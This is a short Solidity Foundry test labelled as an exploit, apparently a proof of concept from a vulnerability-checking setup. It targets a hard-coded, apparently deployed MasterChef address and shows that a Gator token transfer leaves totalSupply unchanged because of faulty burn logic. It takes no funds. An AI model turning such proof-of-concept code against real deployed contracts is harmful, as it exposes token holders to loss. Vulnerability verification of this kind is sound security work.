pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface GatorToken {
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IMasterChef {
    function Gator() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address gatorTokenAddress;
    address constant TARGET = 0x55Da3b152F48378A42D091be1eef2af37964BE45;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        IMasterChef masterChef = IMasterChef(TARGET);
            gatorTokenAddress = masterChef.Gator();
            deal(gatorTokenAddress, address(this), 1000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        GatorToken token = GatorToken(gatorTokenAddress);
            uint256 initialTotalSupply = token.totalSupply();

            // A simple transfer will trigger the tax, which includes the flawed burn logic.
            token.transfer(makeAddr("recipient"), 100 * 1e18);

            uint256 finalTotalSupply = token.totalSupply();

            // Verify that the totalSupply remains unchanged, as per the oracle's check.
            assertEq(finalTotalSupply, initialTotalSupply);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

